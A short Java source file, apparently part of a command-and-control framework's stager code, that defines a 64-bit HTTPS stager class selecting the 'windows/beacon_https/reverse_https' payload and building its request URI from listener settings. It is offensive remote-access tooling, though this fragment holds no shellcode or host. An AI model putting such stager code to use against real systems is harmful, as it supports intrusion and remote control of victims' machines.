package stagers;

import common.ScListener;

public class BeaconHTTPSStagerX64 extends GenericHTTPSStagerX64 {
    public BeaconHTTPSStagerX64(ScListener scListener) {
        super(scListener);
    }

    public String payload() {
        return "windows/beacon_https/reverse_https";
    }

    public String getURI() {
        return getConfig().getURI_X64() + getConfig().getQueryString();
    }
}
